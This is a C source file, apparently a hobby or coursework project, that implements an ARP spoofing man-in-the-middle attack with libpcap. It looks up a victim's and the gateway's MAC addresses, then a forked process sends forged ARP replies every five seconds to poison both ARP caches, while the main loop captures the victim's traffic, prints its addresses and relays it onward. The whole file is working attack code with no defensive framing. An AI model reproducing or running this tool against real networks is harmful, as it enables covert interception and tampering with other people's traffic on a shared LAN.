#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <netinet/in.h>

//ARP Header
#define NETSTAT_IP_ADDR 	19
#define NETSTAT_GW_IP_SIZE 	16
#define ETHER_MACADDR_SIZE 	6
#define ETHER_PROTO_ARP 	0x0806
#define ETHER_PROTO_SIZE 	2

//ARP Header
#define ARP_HARDWARE_TYPE_SIZE 	2
#define ARP_PROTO_TYPE_SIZE 	2
#define ARP_OPCODE_SIZE 		2

//IP Header
#define IP_ADDR_SIZE 	4

#define ARP_REQEST 		0
#define ARP_REPLY		1


//gcc -o pcap pcap.c -lpcap
typedef struct Ethernet_Header {
	unsigned char dstMACaddr[6];
	unsigned char srcMACaddr[6];
	unsigned char type[4];	
} EthHeader;

typedef struct IP_Header {
	unsigned char IPhLen; 			//Lenth of IP Header
	unsigned char protocol;
	unsigned char srcIPaddr [4];	//IP address of Source
	unsigned char dstIPaddr [4];	//IP address of destination
} IPHeader;

typedef struct TCP_Header {
	unsigned char srcport[2];
	unsigned char dstport[2];
} TCPHeader;

typedef struct NETINFO {
	unsigned char IPaddr[4];
	unsigned char MACaddr[6];
} NetInfo;

typedef struct INFECTIONLIST {
	NetInfo victim[6];
	unsigned int count;
} InfectionList;

int Ethernet_Header_Parsing (const u_char * packet, EthHeader * ethheader){
	int i;
	//Parse dst Mac address
	for (i = 0; i < 6; i++)
		ethheader->dstMACaddr[i] = (unsigned char)packet[i];

	//Parse src Mac address
	for (i = 0; i < 6; i++) 
		ethheader->srcMACaddr[i] = (unsigned char)packet[i + 6];

	for (i = 0; i < 2; i++)
		ethheader->type[i] = (unsigned char) packet[i + 12];
	
	return 0;
};

int IP_Header_Parsing (const u_char * packet, IPHeader * IPheader) {
	int i = 0;

	//Parsing IP header lenth...
	IPheader->IPhLen = packet[0] & 0x0F;

	//Parsing Protocol of higher layer...
	IPheader->protocol = packet[9];

	//Parsing source IP address...
	for (i = 0; i < 4; i++)
		IPheader->srcIPaddr[i] = (unsigned char) packet[i + 12];

	//Parsing destination IP address...
	for (i = 0; i < 4; i++)
		IPheader->dstIPaddr[i] = (unsigned char) packet[i + 16];

	return 0;
};
int gw_IP_Parsing (unsigned char * gw_IP) {
	unsigned char pipe_buf[1024];
	int arp_pipe[2];
	pid_t pid;
	int i = 0;

	if (pipe(arp_pipe) == -1){
		printf("error : Cannot create pipe\n");
		return -1;
	}

	pid = fork();

	if (pid == 0) { 			// if process is child process
		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
		close(arp_pipe[0]);		// close for-read fd
		close(arp_pipe[1]);
		system("/bin/netstat -n -r | grep UG | awk '{print $2}'");	//In MAC OS, gate
		exit(1);
	}

	else {		
		close(arp_pipe[1]);		// close for-write fd
		read(arp_pipe[0], pipe_buf, 18);
		close(arp_pipe[0]);		
		printf("gateway IP : %s", pipe_buf);
		
		inet_aton(pipe_buf, (struct in_addr *)gw_IP);
		
		
	}

	return 0;
}

int own_IP_Parsing(const unsigned char * own_IP) {
	unsigned char pipe_buf[1024];
	int arp_pipe[2];
	pid_t pid;
	int i = 0;

	if (pipe(arp_pipe) == -1){
		printf("error : Cannot create pipe\n");
		return -1;
	}

	pid = fork();

	if (pid == 0) { 			// if process is child process
		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
		close(arp_pipe[0]);		// close for-read fd
		close(arp_pipe[1]);
		system("/sbin/ifconfig -a | grep inet | grep Bcast | awk '{print $2}' | awk -F: '{print $2}'");
		exit(1);
	}

	else {
		close(arp_pipe[1]);		// close for-write fd
		read(arp_pipe[0], pipe_buf, 18);
		close(arp_pipe[0]);

		
		printf("own IP address : %s", pipe_buf);
		inet_aton(pipe_buf, (struct in_addr *)own_IP);		
	}

	return 0;
}

int own_MAC_Parsing (const unsigned char * own_MACaddr) {
	unsigned char pipe_buf[1024];
	int arp_pipe[2];
	unsigned char temp;
	unsigned char tempMAC[17];
	pid_t pid;
	int i = 0;

	if (pipe(arp_pipe) == -1){
		printf("error : Cannot create pipe\n");
		return -1;
	}

	pid = fork();

	if (pid == 0) { 			// if process is child process
		dup2(arp_pipe[1], 1);	// copy pipe for write to stdout
		close(arp_pipe[0]);		// close for-read fd
		close(arp_pipe[1]);
		system("/sbin/ifconfig -a | grep HWaddr | awk '{print $5}'");	// ifconfig path in MAC OS X : /sbin/ifconfig
		exit(1);
	}

	else {
		close(arp_pipe[1]);		// close for-write fd
		
		read(arp_pipe[0], pipe_buf, 18);

	
		ether_aton_r(pipe_buf, (struct in_addr *)own_MACaddr);
		printf("own MAC address : %02x:%02x:%02x:%02x:%02x:%02x\n", own_MACaddr[0], own_MACaddr[1], own_MACaddr[2], own_MACaddr[3], own_MACaddr[4], own_MACaddr[5]);
	}

	return 0;
}

int Make_ARP_Packet (unsigned char * packet, unsigned char * senderMAC, unsigned char * senderIP, unsigned char * targetMAC, unsigned char * targetIP, int OPCODE) {
	int i = 0;
	int curAddr = 0;
	
	//Constructing Ethernet Header	
	memcpy(&packet[curAddr], targetMAC, ETHER_MACADDR_SIZE);	
	curAddr += ETHER_MACADDR_SIZE;
	
	memcpy(&packet[curAddr], senderMAC, ETHER_MACADDR_SIZE);
	curAddr += ETHER_MACADDR_SIZE;
	
	memcpy(&packet[curAddr], "\x08\x06", ETHER_PROTO_SIZE);
	curAddr += ETHER_PROTO_SIZE;
	
	//Hardware type : Ethernet
	memcpy(&packet[curAddr], "\x00\x01", ARP_HARDWARE_TYPE_SIZE);
	curAddr += ARP_HARDWARE_TYPE_SIZE;
	
	memcpy(&packet[curAddr], "\x08\x00", ARP_PROTO_TYPE_SIZE);
	curAddr += ARP_PROTO_TYPE_SIZE;

	//Hardware Size
	memcpy(&packet[curAddr], "\x06", 1);
	curAddr++;
	
	//Protocol Size
	memcpy(&packet[curAddr], "\x04", 1);
	curAddr++;	

	//OPCODE
	if (OPCODE == ARP_REQEST)
		memcpy(&packet[curAddr], "\x00\x01", ARP_OPCODE_SIZE);
	else
		memcpy(&packet[curAddr], "\x00\x02", ARP_OPCODE_SIZE);
	curAddr += ARP_OPCODE_SIZE;

	//senderMAC address
	memcpy(&packet[curAddr], senderMAC, ETHER_MACADDR_SIZE);
	curAddr += ETHER_MACADDR_SIZE;

	//sender IP address
	memcpy(&packet[curAddr], senderIP, IP_ADDR_SIZE);
	curAddr += IP_ADDR_SIZE;

	if (OPCODE == ARP_REQEST)
		memcpy(&packet[curAddr], "\x00\x00\x00\x00\x00\x00", ETHER_MACADDR_SIZE);
	else
		memcpy(&packet[curAddr], targetMAC, ETHER_MACADDR_SIZE);
	
	curAddr	+= ETHER_MACADDR_SIZE;

	memcpy(&packet[curAddr], targetIP, IP_ADDR_SIZE);
	curAddr += IP_ADDR_SIZE;

	return 0;
}

int PrintPacket(unsigned char * packet, int len) {
	int i = 0;

	for (i = 0; i < len; i++) {
		if (i == 0)				printf("%02X ",   packet[0]);
		else if ((i % 16) == 0)	printf("\n%02X ", packet[i]);
		else if ((i % 8) == 0)	printf(" %02X ",  packet[i]);
		else 					printf("%02X ",   packet[i]);
	}
	printf("\n");

	return 0;
}

int Packet_Relay(pcap_t * pcd, const u_char * packet, int len, char * ownMAC, char * recvMAC) {
	char * curAddr;

	curAddr = (unsigned char *)packet;

	//change dst MAC to original dst MAC
	memcpy(curAddr, recvMAC, ETHER_MACADDR_SIZE);
	curAddr += ETHER_MACADDR_SIZE;

	//change src MAC to own MAC address to prevent arp table from recovering
	memcpy(curAddr, ownMAC, ETHER_MACADDR_SIZE);
	printf("Relay packet\n");
	//PrintPacket((unsigned char *)packet, len);
	pcap_sendpacket(pcd, packet, len);
	return 0;
}

int ARPInfection (pcap_t * pcd, InfectionList * victimlist, NetInfo * own, NetInfo * gw) {
	unsigned char arp_packet[42];
	int i = 0;

	for (i = 0; i < victimlist->count; i++) {		
		// Infect victim's arp table
		Make_ARP_Packet(arp_packet, own->MACaddr, gw->IPaddr, victimlist->victim[i].MACaddr, victimlist->victim[i].IPaddr, ARP_REPLY);
		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
		
		//Infect gw's arp table
		Make_ARP_Packet(arp_packet, own->MACaddr, victimlist->victim[i].IPaddr, gw->MACaddr, gw->IPaddr, ARP_REPLY);
		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
	
	}

	return 0;
}

int main (int argc, char * argv[]) {
	int i = 0;
	int j = 0;
	char ipstr[4];
	char * curAddr;
	pid_t pid;
	NetInfo gw;
	NetInfo own;
	NetInfo victim;
	unsigned char broadcastMAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
	EthHeader ethheader;
	IPHeader IPheader;
	char * dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	const u_char * packet;
	pcap_t * pcd;		/*packet capture descriptor*/
	bpf_u_int32 mask;	/*netmask of device*/
	bpf_u_int32 net;	/*IP of device*/
	unsigned char arp_packet[42];
	unsigned char arp_packet_gw[42];
	unsigned char arp_packet_victim[42];
	struct pcap_pkthdr header;
	struct bpf_program fp;
	InfectionList victimlist = {0, };
	int temp = 0;

	if (argc < 2) {
		printf("Need Victim IP address\n");
		return -1;
	}

	printf("Find a device automatically...\n");
	dev = pcap_lookupdev(errbuf);
		
	if(dev == NULL) {
		fprintf(stderr, "Couldn't find device : %s\n", errbuf);
		return 2;
	}
	
	printf("Device : %s\n", dev);	
	
	pcd = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	
	if (pcd == NULL) {
		fprintf(stderr, "Cannot open device(%s) : %s\n", dev, errbuf);
		return 2;
	}
	
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Cannot get netmask for device(%s) : %s\n", dev, errbuf);
	}

	//examine data link Layer
	
	if ((pcap_datalink(pcd)) != DLT_EN10MB) {	//Capture ethernet packet only.
		fprintf(stderr, "Device %s does not provide Ethernet header", dev);
		return 2;
	}
	
	printf("Data-link Layer check completed...(type : Ethernet)\n");	

	inet_aton(argv[1], (struct in_addr *) &victim.IPaddr);// Save victim's IP. In MAC OS, there was no inet_aton_r API, which is re_entrant...

	gw_IP_Parsing((unsigned char *)gw.IPaddr);			// using netstat program, get IP address of gateway
	own_IP_Parsing((unsigned char *)own.IPaddr);			// using ifconfig program, get IP address of own system
	own_MAC_Parsing((unsigned char *)own.MACaddr);//	


	// Finds out victim's MAC address..//
	printf("Get MAC address of victim by ARP REQUEST\n");

	Make_ARP_Packet(arp_packet, own.MACaddr, own.IPaddr, broadcastMAC, victim.IPaddr, ARP_REQEST); // With this Request, get vicim's MAC address...

	while (1) {
		//packet
		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));	//returns 0 if success
		printf("...\n");
		packet = pcap_next(pcd, &header);

		
		if (packet == NULL)	//if packet is NULL, continue
			continue;

		Ethernet_Header_Parsing(packet, &ethheader);

		if (ntohs(*((unsigned short *)ethheader.type)) != ETHER_PROTO_ARP) 
			continue;

		if ( memcmp(&packet[28], victim.IPaddr, 4) == 0) {
			memcpy(&victim.MACaddr, ethheader.srcMACaddr, 6);
			printf("done\nvictim_MAC address : %02x:%02x:%02x:%02x:%02x:%02x\n", victim.MACaddr[0], victim.MACaddr[1], victim.MACaddr[2], victim.MACaddr[3], victim.MACaddr[4], victim.MACaddr[5]);
			break;
		}
	}	


	memcpy(victimlist.victim[0].IPaddr, victim.IPaddr, 4);
	memcpy(victimlist.victim[0].MACaddr, victim.MACaddr, 6);
	victimlist.count++;




	//Finds out gw's MAC address...
	Make_ARP_Packet(arp_packet, own.MACaddr, own.IPaddr, broadcastMAC, gw.IPaddr, ARP_REQEST);

	printf("Get MAC address of gw by ARP REQEUST\n");
	while(1) {

		pcap_sendpacket(pcd, arp_packet, sizeof(arp_packet));
		printf("...\n");
		packet = pcap_next(pcd, &header);

		if (packet == NULL)
			continue;

		Ethernet_Header_Parsing(packet, &ethheader);

		if (ntohs(*((unsigned short *)ethheader.type)) != ETHER_PROTO_ARP)
			continue;

		if (memcmp(&packet[28], &gw.IPaddr, 4) == 0) {
			memcpy(&gw.MACaddr, ethheader.srcMACaddr, 6);
			printf("done\ngw_MAC address : %02x:%02x:%02x:%02x:%02x:%02x\n", gw.MACaddr[0], gw.MACaddr[1], gw.MACaddr[2], gw.MACaddr[3], gw.MACaddr[4], gw.MACaddr[5]);
			break;
		}

	}
	
	pid = fork();

	if (pid == 0) { //Sending posion arp_reply packet
		while(1) {
			printf("Sending ARP REPLY\n");
			ARPInfection (pcd, &victimlist, &own, &gw);
			sleep(5);
		}
		return 0;
	}

	else {
		while (1) {
			
			//printf("Sending ARP REPLY\n");
			//ARPInfection (pcd, &victimlist, &own, &gw); //not yet gw...
			
			//printf("captured packet\n");


			packet = pcap_next(pcd, &header);
			if (packet == NULL)
				continue;

//			PrintPacket((unsigned char *)packet, header.len);

			//Parsing the 
			curAddr = (unsigned char *)packet;

			Ethernet_Header_Parsing (curAddr, &ethheader);
			curAddr += 14;
				
			if (ntohs(*((unsigned short *)ethheader.type)) != 0x0800)
				continue;

			IP_Header_Parsing(curAddr, &IPheader);
		
			if (memcmp(IPheader.dstIPaddr, own.IPaddr, 4) && !memcmp(ethheader.dstMACaddr, own.MACaddr, 6)){ 
				printf("*****PACKET INFO*****\n");

				//printf("src IP address : ");
				
				printf("srcIP -> dstIP : 	");
				for (i = 0; i < 4; i++) {
					if (i != 3) printf("%d.", IPheader.srcIPaddr[i]);
					else 		printf("%d 	->	",  IPheader.srcIPaddr[i]);	
				}

				//printf("dst IP address : ");
				for (i = 0; i < 4; i++) {
					if (i != 3) printf("%d.", IPheader.dstIPaddr[i]);
					else 		printf("%d\n",  IPheader.dstIPaddr[i]);	
				}

				//PrintPacket((unsigned char *)packet, header.len);

				if ( memcmp(ethheader.dstMACaddr, own.MACaddr, 6) || !memcmp(IPheader.dstIPaddr, own.IPaddr, 4) )
					continue;

				if (!memcmp(ethheader.srcMACaddr, gw.MACaddr, 6)) { // if src is gw
					for (i = 0; i < victimlist.count; i++) {
						if (!memcmp(IPheader.dstIPaddr, victimlist.victim[i].IPaddr, 4)) {

							for (j = 0; j<6; j++)
								printf("%02x ", ethheader.dstMACaddr[j]);
							


							printf("\n");
							//PrintPacket((unsigned char *)packet, header.len);
							
							for (j = 0; j<6; j++)
								printf("%02x ",victimlist.victim[i].MACaddr[j]);
							printf("\n");

							Packet_Relay(pcd, packet, header.len, own.MACaddr, victimlist.victim[i].MACaddr);
							break;
						}
					}
				}		

				else{ //if src is victim
					for (i = 0; i<6; i++)
						printf("%02x ", ethheader.dstMACaddr[i]);
					printf("\n");
					//PrintPacket((unsigned char *)packet, header.len);


					Packet_Relay(pcd, packet, header.len, own.MACaddr, gw.MACaddr); //relay packet to gw
				}
			}
		}
	}
	return 0;
}